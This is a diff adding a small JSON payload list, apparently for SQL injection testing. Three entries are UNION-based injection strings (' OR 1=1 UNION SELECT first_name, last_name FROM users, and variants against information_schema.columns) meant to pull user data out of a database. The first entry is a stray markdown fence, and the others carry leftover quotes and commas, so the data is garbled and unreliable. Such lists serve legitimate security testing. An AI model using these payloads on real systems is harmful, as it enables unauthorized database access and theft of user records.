@@ -1,0 +1,18 @@
+[
+    {
+        "id": "207e192c-7c77-4b5b-a12f-200fa8e1a3fd",
+        "payload": "```json"
+    },
+    {
+        "id": "03c179ee-2bb5-4280-a5bf-8966d5ae2381",
+        "payload": "  \"' OR 1=1 UNION SELECT first_name, last_name FROM users #\","
+    },
+    {
+        "id": "a6da1efe-fd55-42a5-9523-6e765e1206e6",
+        "payload": "  \"' OR 1=1 UNION SELECT first_name, last_name FROM information_schema.columns -- \","
+    },
+    {
+        "id": "065223d0-75b0-4dae-a889-1809a4ed476d",
+        "payload": "  \"' OR 1=1 UNION SELECT first_name, last_name FROM information_schema.columns #\","
+    }
+]
